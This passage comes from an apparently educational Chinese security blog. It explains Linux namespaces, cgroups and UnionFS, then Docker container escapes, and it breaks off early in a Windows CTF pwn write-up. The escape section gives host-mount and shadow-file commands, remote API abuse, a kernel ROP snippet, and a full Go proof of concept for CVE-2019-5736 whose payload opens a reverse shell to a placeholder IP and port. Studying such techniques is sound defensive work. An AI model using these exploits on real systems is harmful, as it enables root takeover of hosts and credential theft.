0 Mar  6 09:28 pid_for_children -&gt; <span class="string">&#x27;pid:[4026531836]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 time -&gt; <span class="string">&#x27;time:[4026531834]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 time_for_children -&gt; <span class="string">&#x27;time:[4026531834]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 user -&gt; <span class="string">&#x27;user:[4026531837]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 uts -&gt; <span class="string">&#x27;uts:[4026531838]&#x27;</span></span><br></pre></td></tr></table></figure>

<p>与其有关的系统调用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 有个unshare的命令，需要区分一下</span></span><br><span class="line">$ man 2 unshare</span><br><span class="line">$ man <span class="built_in">clone</span></span><br></pre></td></tr></table></figure>

<p>unshare创建命名空间</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:/ <span class="comment"># readlink /proc/$$/ns/uts </span></span><br><span class="line">uts:[4026531838]</span><br><span class="line">:/ <span class="comment"># unshare --uts /bin/bash</span></span><br><span class="line">:/ <span class="comment"># readlink /proc/$$/ns/uts </span></span><br><span class="line">uts:[4026532690]</span><br></pre></td></tr></table></figure>

<h3 id="cgroup"><a href="#cgroup" class="headerlink" title="cgroup"></a>cgroup</h3><p>资源限制</p>
<p>cgroup（control group）是linux内核的一个特性，它可以用于限制、计算、隔离进程组对计算机资源的使用（如CPU、memory、disk I&#x2F;O、network等）。</p>
<p>cgroup有如下四个功能：</p>
<ol>
<li>资源限制（Resource limits）：限制进程组对某一特定资源（CPU，disk，或network）的使用量</li>
<li>优先级（Prioritization）：通过给某个cgroup中的进程分配多一些资源（相比于其他cgroup），从而提高优先级</li>
<li>审计（Accounting）：记录进程&#x2F;进程组使用的资源量</li>
<li>控制（Control）：进程组控制，如可以使用freezer将进程组挂起或恢复</li>
</ol>
<p>cgroup是容器（containers）的一个重要组成部分，因为容器中通常会运行多个进程，这些进程通常需要一并控制。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/self/cgroup</span><br><span class="line">0::/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-4f943e0d-c769-40ec-92df-ca2643d86752.scope</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span> -al /sys/fs/cgroup		<span class="comment"># 查看cgroup文件系统，目录下每个目录代表一个cgroup类型。每一个cgroup类都遵循层级结构</span></span><br></pre></td></tr></table></figure>


<h3 id="Union-FS"><a href="#Union-FS" class="headerlink" title="Union FS"></a>Union FS</h3><p>Union File System ，简称 UnionFS，<strong>把其他文件系统联合到一个联合挂载点的文件系统服务</strong>，目的是<strong>将多个文件联合在一起成为一个统一的视图</strong></p>
<p>它的思想是，如果一个资源是重复的，但没有任何修改，这时候并不需要立即创建一个新的资源，这个资源可以被新旧实例共享。</p>
<p>创建新资源发生在第一次写操作，也就是对资源进行修改的时候。通过这种资源共享的方式，可以显著地减少未修改资源复制带来的消耗，但是也会在进行资源修改的时候增减小部分的开销。</p>
<p>OverlayFS：Overlayfs 是一种堆叠文件系统，它依赖并建立在其它的文件系统之上（例如 ext4fs 和 xfs 等等），并不直接参与磁盘空间结构的划分，仅仅将原来底层文件系统中不同的目录进行“合并”，然后向用户呈现。<a href="https://zhuanlan.zhihu.com/p/679328995">OverlayFS</a></p>
<h3 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h3><p>如果觉得不明白，可以自己写一个简单的Docker</p>
<ul>
<li><a href="https://www.infoq.com/articles/build-a-container-golang/">Build Your Own Container Using Less than 100 Lines of Go</a></li>
<li><a href="https://www.wolai.com/curry00/rjPry5XyA6BLYyUoEaDWDm">手写docker</a></li>
</ul>
<h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><h3 id="检测Docker环境"><a href="#检测Docker环境" class="headerlink" title="检测Docker环境"></a>检测Docker环境</h3><ul>
<li>检查根目录下是否存在<code>.dockerenv</code>文件</li>
<li>检查 <code>/proc/1/cgroup</code> 是否存在含有docker字符串!</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@06fcbcd12128:/<span class="comment"># ls -al /</span></span><br><span class="line">total 60</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar  6 01:52 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar  6 01:52 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Mar  6 01:52 .dockerenv</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># ???</span></span><br><span class="line">root@06fcbcd12128:/<span class="comment"># cat /proc/1/cgroup</span></span><br><span class="line">0::/</span><br></pre></td></tr></table></figure>

<h3 id="Docker-启动容器的危险配置"><a href="#Docker-启动容器的危险配置" class="headerlink" title="Docker 启动容器的危险配置"></a>Docker 启动容器的危险配置</h3><p>如果设定了以下配置就会导致相应的隔离机制失效：</p>
<ul>
<li>–privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破</li>
<li>–net&#x3D;host：使容器与宿主机处于同一网络命名空间，网络隔离被打破</li>
<li>–pid&#x3D;host：使容器与宿主机处于同一进程命令空间，进程隔离被打破</li>
<li>–volume &#x2F;:&#x2F;host：宿主机根目录被挂载到容器内部，文件系统隔离被打破</li>
</ul>
<p>当操作者执行<code>docker run --privileged</code>时，Docker将允许容器访问宿主机上的所有设备，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。可以通过写ssh密钥、计划任务等方式达到逃逸。</p>
<p>判断是否为特权模式：CapEff 主要是检查线程的执行权限。如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff <a href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html">(1)</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 特权级下</span></span><br><span class="line">bash-4.4<span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 0000003fffffffff</span><br><span class="line">CapEff: 0000003fffffffff</span><br><span class="line">CapBnd: 0000003fffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非特权级下</span></span><br><span class="line">root@a8a2a8be5ee4:/<span class="comment"># cat /proc/1/status | grep Cap</span></span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	00000000a80425fb</span><br><span class="line">CapEff:	00000000a80425fb</span><br><span class="line">CapBnd:	00000000a80425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ capsh --decode=0000003fffffffff</span><br><span class="line">0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br></pre></td></tr></table></figure>

<p>挂载文件系统进行逃逸</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看磁盘文件</span></span><br><span class="line">fdisk -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载</span></span><br><span class="line"><span class="built_in">mkdir</span> -p hacker</span><br><span class="line">mount /dev/sda1 /hacker</span><br><span class="line"><span class="built_in">cat</span> /hacker/etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定时任务</span></span><br><span class="line">/hacker/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>

<p>也可以添加新的用户进行登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line"><span class="built_in">chroot</span> /mnt adduser john</span><br></pre></td></tr></table></figure>

<h3 id="Docker危险挂载"><a href="#Docker危险挂载" class="headerlink" title="Docker危险挂载"></a>Docker危险挂载</h3><h4 id="docker-sock"><a href="#docker-sock" class="headerlink" title="docker.sock"></a>docker.sock</h4><p>docker.sock是**Docker守护进程(Docker daemon)<strong>默认监听的</strong>Unix域套接字(Unix domain socket)**，容器中的进程可以通过它与Docker守护进程进行通信。</p>
<p>docker.sock挂载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -itd -v /var/run/docker.sock:/var/run/docker.sock <span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p>检测</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -lah /var/run/docker.sock</span><br></pre></td></tr></table></figure>

<h4 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h4><p>相当于直接写主机的根目录了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chroot</span> /mount_dir</span><br></pre></td></tr></table></figure>

<h4 id="procfs"><a href="#procfs" class="headerlink" title="procfs"></a>procfs</h4><p>查看是否挂载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name core_pattern</span><br></pre></td></tr></table></figure>

<p>逃逸，<a href="https://wiki.teamssix.com/CloudNative/Docker/docker-procfs-escape.html">(2)</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 寻找在主机下的绝对路径</span></span><br><span class="line"><span class="built_in">cat</span> /proc/mounts | xargs -d <span class="string">&#x27;,&#x27;</span> -n 1 | grep workdir</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入反弹 shell 到目标的 proc 目录下</span></span><br></pre></td></tr></table></figure>

<h3 id="Docker-remote-API"><a href="#Docker-remote-API" class="headerlink" title="Docker remote API"></a>Docker remote API</h3><p>通过将宿主机的docker服务通过socket的方式暴露给外部连接，使得其他主机也可以访问docker服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure>

<p>可以利用 remote API 来操作docker进行逃逸</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看容器</span></span><br><span class="line">curl http://&lt;target&gt;:2375/containers/json</span><br><span class="line">docker -H tcp://&lt;target&gt;:2375 ps -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将远程的根目录挂载</span></span><br><span class="line">docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="程序漏洞导致Docker-逃逸"><a href="#程序漏洞导致Docker-逃逸" class="headerlink" title="程序漏洞导致Docker 逃逸"></a>程序漏洞导致Docker 逃逸</h3><p>使用 <code>docker version</code> 命令可以看到 <code>runc &amp;&amp; containerd</code> 组件</p>
<h4 id="runc"><a href="#runc" class="headerlink" title="runc"></a>runc</h4><p>runc是一个底层服务工具，runC 管理容器的创建，运行，销毁等，docker部分版本服务运行时底层其实在运行着runc服务，攻击者可以通过特定的容器镜像或者exec操作重写宿主机上的runc 二进制文件，并在宿主机上以root身份执行命令。</p>
<p>一个容器开启时，可以分为以下三步</p>
<ul>
<li>fork 创建子进程</li>
<li>初始化容器化环境</li>
<li>将执行流重定向到用户提供的入口点</li>
</ul>
<p><code>docker run</code>等命令的时候实际上在底层调用的是runC程序，我们在容器中运行 <code>/bin/bash</code> 也会调用到runC</p>
<p><img src="https://ts1.cn.mm.bing.net/th/id/R-C.cd098a90bebc7feb12058053becebedc?rik=DLvUCkgJJdKuYg&riu=http://xuxinkun.github.io/img/docker-oci-runc-k8s/kubelet.png&ehk=mGer8iOXT1GplC3OjM4e3sLhuBjr74asYNM3BLOwePA=&risl=&pid=ImgRaw&r=0" alt="runc"></p>
<p>procfs:</p>
<ul>
<li><code>/proc/[PID]/exe</code>: 一种特殊的软连接，是该进程自身对应的本地文件</li>
<li><code>/proc/[PID]/fd/</code>: 这个目录下存放了该进程打开的所有文件描述符</li>
</ul>
<p><code>/proc/[PID]/exe</code>的特殊之处在于当权限通过的情况下打开这个文件，内核将会之间返回一个指向该文件的文件描述符，并非按照传统的打开方式做路径分析和文件查找，这就会导致绕过了mnt命名空间和chroot的限制。</p>
<p>CVE-2019-5736：该漏洞允许攻击者重写宿主机上的runc 二进制文件，导致攻击者可以在宿主机上以root身份执行命令。</p>
<ul>
<li>修改容器内的<code>/bin/sh</code>文件，改为<code>#!/proc/self/exe</code>，这样的话，当容器内的<code>/bin/sh</code>被执行的时候，实际上被执行的文件路径是<code>/proc/self/exe</code></li>
<li><code>/proc/self/exe</code>是内核为每个进程创建的符号链接，指向<strong>为该进程而执行的二进制文件</strong>。当容器中的<code>/bin/sh</code>被执行时，<code>/proc/self/exe</code>指向的宿主机上的<code>runc</code>就会被执行</li>
</ul>
<p>漏洞的存在原理在于&#x2F;proc&#x2F;pid&#x2F;exe这个绑定的方式，&#x2F;proc是比较熟知的一个概念，为一个虚拟文件系统，其中的文件能够显示当前的进程运行信息。&#x2F;proc&#x2F;pid&#x2F;exe是一个程序链接，指向这个pid运行的程序。</p>
<p>而这个漏洞的利用方式就在于，在docker里查找到runc的exe，获取对应于该位置的一个文件句柄，然后向这个位置写入东西的话，就能够将宿主机的程序覆盖掉，然后用户下一次再要运行runc的时候，就会触发反弹shell。</p>
<p>PoC</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">// Implementation of CVE-2019-5736</span></span><br><span class="line"><span class="comment">// Created with help from @singe, @_cablethief, and @feexd.</span></span><br><span class="line"><span class="comment">// This commit also helped a ton to understand the vuln</span></span><br><span class="line"><span class="comment">// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is the line of shell commands that will execute on the host</span></span><br><span class="line"><span class="comment">// 替换IP 和 PORT</span></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp; 1 &amp;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//首先来看看能不能打开/bin/sh，即有root权限就成</span></span><br><span class="line">	fd, err := os.Create(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//然后将其覆盖为#!/proc/self/exe</span></span><br><span class="line">	fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/sh successfully&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 循环遍历/proc里的文件，直到找到runc是哪个进程</span></span><br><span class="line">	<span class="keyword">var</span> found <span class="type">int</span></span><br><span class="line">	<span class="keyword">for</span> found == <span class="number">0</span> &#123;</span><br><span class="line">		pids, err := ioutil.ReadDir(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, f := <span class="keyword">range</span> pids &#123;</span><br><span class="line">			fbytes, _ := ioutil.ReadFile(<span class="string">&quot;/proc/&quot;</span> + f.Name() + <span class="string">&quot;/cmdline&quot;</span>)</span><br><span class="line">			fstring := <span class="type">string</span>(fbytes)</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(fstring, <span class="string">&quot;runc&quot;</span>) &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;[+] Found the PID:&quot;</span>, f.Name())</span><br><span class="line">				found, err = strconv.Atoi(f.Name())</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 循环去读这个/proc/pid/exe，先拿到一个该文件的fd，该fd就指向了runc程序的位置</span></span><br><span class="line">	<span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line">	<span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">		handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 然后不断的去尝试写这个指向的文件，一开始由于runc会先占用着，写不进去，直到runc的占用解除了，就立即写入</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">			writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>CVE-2024-21626：由于 <code>runc</code> 内部不正确处理文件描述符，导致泄漏关键的宿主机文件描述符到容器中。</p>
<p>近日大火的CVE，在翻看<a href="https://bestwing.me/CVE-2024-21626-container-escape.html">这位师傅的文章</a>时看到的</p>
<p><del>看起来很NB，虽然我现在看不懂😭</del></p>
<h4 id="containerd"><a href="#containerd" class="headerlink" title="containerd"></a>containerd</h4><p>containerd 是一个工业级标准的容器运行时，它强调<strong>简单性</strong>、<strong>健壮性</strong>和<strong>可移植性</strong>，containerd 可以负责干下面这些事情：</p>
<ul>
<li>管理容器的生命周期（从创建容器到销毁容器）</li>
<li>拉取&#x2F;推送容器镜像</li>
<li>存储管理（管理镜像及容器数据的存储）</li>
<li>调用 runc 运行容器（与 runc 等容器运行时交互）</li>
<li>管理容器网络接口及网络</li>
</ul>
<h3 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h3><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>commit_creds(prepare_kernel_cred(0))不会突破namespace对于进程的限制，也就是说即使在完成提权之后，task_struct中的fs_struct或者是ns_proxy都不受到影响还处于原本的命名空间中。</p>
<p>可以看CVE-2021-22555的漏洞利用，在得到root权限后，需要在内核中将进程的命名空间切换为初始的全局命名空间 <code>init_nsproxy</code> 即可完成容器逃逸，执行<code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> 即可替换掉当前进程的命名空间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</span></span><br><span class="line">  *rop++ = kbase_addr + POP_RDI_RET;</span><br><span class="line">  *rop++ = <span class="number">1</span>; <span class="comment">// RDI</span></span><br><span class="line">  *rop++ = kbase_addr + FIND_TASK_BY_VPID;</span><br><span class="line">  *rop++ = kbase_addr + POP_RCX_RET;</span><br><span class="line">  *rop++ = <span class="number">4</span>; <span class="comment">// RCX</span></span><br><span class="line">  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;</span><br><span class="line">  *rop++ = <span class="number">0xDEADBEEF</span>; <span class="comment">// RBP</span></span><br><span class="line">  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;</span><br><span class="line">  *rop++ = kbase_addr + POP_RSI_RET;</span><br><span class="line">  *rop++ = kbase_addr + INIT_NSPROXY; <span class="comment">// RSI</span></span><br><span class="line">  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;</span><br></pre></td></tr></table></figure>

<h4 id="dirty-pipe"><a href="#dirty-pipe" class="headerlink" title="dirty pipe"></a>dirty pipe</h4><p>通过利用 <code>CAP_DAC_READ_SEARCH</code> 与脏管道可以实现覆盖主机文件，实际上主要是<code>CAP_DAC_READ_SEARCH</code>可以调用<code>open_by_handle_at</code>, 可以获得主机文件的文件描述符，配合脏管道于是就可以修改主机文件。但是需要添加cap权限 <a href="https://github.com/greenhandatsjtu/CVE-2022-0847-Container-Escape">(3)</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it --cap-add=CAP_DAC_READ_SEARCH ubuntu</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://wiki.teamssix.com/CloudNative/">云原生 | T Wiki (teamssix.com)</a></li>
<li><a href="https://liuliuliuzy.github.io/tags/docker/">Docker</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>BFS-Ekoparty2022-windows-pwn</title>
    <url>/2024/08/04/BFS-Ekoparty2022-windows-pwn/</url>
    <content><![CDATA[<blockquote>
<p>Windows userland PWN</p>
</blockquote>
<span id="more"></span>

<p>在逛论坛时发现一个Linux kernel的pwn题目，同时还有一个Windows，本来以为也是内核态，下载后发现是用户态，研究一下</p>
<p>网址：<a href="https://labs.bluefrostsecurity.de/blog.html/2022/10/25/bfs-ekoparty-2022-exploitation-challenges/">BFS Ekoparty 2022 Exploitation Challenges</a>真好，还能直接发offer😭</p>
<h2 id="eko"><a href="#eko" class="headerlink" title="eko"></a>eko</h2><p>弹出计算机就算成功，不能使用额外的库。</p>
<ul>
<li>在本机win11 24h2进行调试</li>
</ul>
<p>winchecksec</p>
<figure class="highlight pwsh"><table><tr><td class="code"><pre><span class="line">bfs<span class="literal">-eko2022</span> ❯ winchecksec .\bfs<span class="literal">-eko2022</span>.exe</span><br><span class="line">Warn: No load config <span class="keyword">in</span> the PE</span><br><span class="line">Results <span class="keyword">for</span>: .\bfs<span class="literal">-eko2022</span>.exe</span><br><span class="line">Dynamic Base    : <span class="string">&quot;Present&quot;</span></span><br><span class="line">ASLR            : <span class="string">&quot;Present&quot;</span></span><br><span class="line">High Entropy VA : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">Force Integrity : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">Isolation       : <span class="string">&quot;Present&quot;</span></span><br><span class="line">NX              : <span class="string">&quot;Present&quot;</span></span><br><span class="line">SEH             : <span class="string">&quot;Present&quot;</span></span><br><span class="line">CFG             : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">RFG             : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">SafeSEH         : <span class="string">&quot;NotApplicable&quot;</span></span><br><span class="line">GS              : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">Authenticode    : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">.NET            : <span class="string">&quot;NotPresent&quot;</span></span><br></pre></td></tr></table></figure>

<p>x64dbg 插件：<a href="https://github.com/klks/checksec">checksec: x64dbg plugin to check security settings</a>，可以看相关dll的保护。</p>
<p>没有GS保护？但是使用IDA打开</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140001474</span>                 mov     rcx, [rsp+<span class="number">0F</span>68h+var_18]</span><br><span class="line">.text:<span class="number">000000014000147</span>C                 <span class="keyword">xor</span>     rcx, rsp        ; StackCookie</span><br><span class="line">.text:<span class="number">000000014000147F</span>                 call    __security_check_cookie</span><br><span class="line">.text:<span class="number">0000000140001484</span>                 add     rsp, <span class="number">0F</span>68h</span><br><span class="line">.text:<span class="number">000000014000148B</span>                 retn</span><br></pre></td></tr></table></figure>

<p>创建一个socket，接收消息: <code>0.0.0.0:31415</code></p>
<p>接收0x1000长度的消息，接收握手消息<code>Hello</code>，发送 <code>Hi</code></p>
<p>然后进入一个处理函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_140001240</span><span class="params">(SOCKET a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-F48h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [rsp+24h] [rbp-F44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> lena; <span class="comment">// [rsp+24h] [rbp-F44h]</span></span><br><span class="line">  CHAR CmdLine[<span class="number">3840</span>]; <span class="comment">// [rsp+30h] [rbp-F38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+F30h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">11</span>]; <span class="comment">// [rsp+F40h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i += <span class="number">16</span> )            <span class="comment">// 初始化buf</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)&amp;::buf[i] = <span class="number">0x5050505050505050</span>i64;</span><br><span class="line">    *(_QWORD *)&amp;::buf[i + <span class="number">8</span>] = <span class="number">0xCF58585858585858</span>ui64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot; [+] Processing request\n&quot;</span>);</span><br><span class="line">  len = <span class="built_in">recv</span>(a1, buf, <span class="number">11</span>, <span class="number">0</span>);                   <span class="comment">// 接收cookie</span></span><br><span class="line">  <span class="keyword">if</span> ( len == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Client data error\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &lt; <span class="number">0xB</span>ui64 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Bad size\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)buf != <span class="string">&#x27;2202okE&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Wrong cookie value\n&quot;</span>);</span><br><span class="line">  v7 = buf[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">8</span>] != <span class="string">&#x27;T&#x27;</span> )                          <span class="comment">// type</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Invalid packet type\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(__int16 *)&amp;buf[<span class="number">9</span>] &gt; <span class="number">0xF00</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;  [-] Invalid packet size\n&quot;</span>);</span><br><span class="line">  lena = <span class="built_in">recv</span>(a1, ::buf, *(<span class="type">unsigned</span> __int16 *)&amp;buf[<span class="number">9</span>], <span class="number">0</span>);<span class="comment">// int16 -&gt; uint16 小变大</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot; [+] Data received: %i bytes\n&quot;</span>, lena);</span><br><span class="line">  <span class="built_in">sub_1400011B0</span>(CmdLine, ::buf, lena);          <span class="comment">// 内存copy</span></span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="string">&#x27;T&#x27;</span> 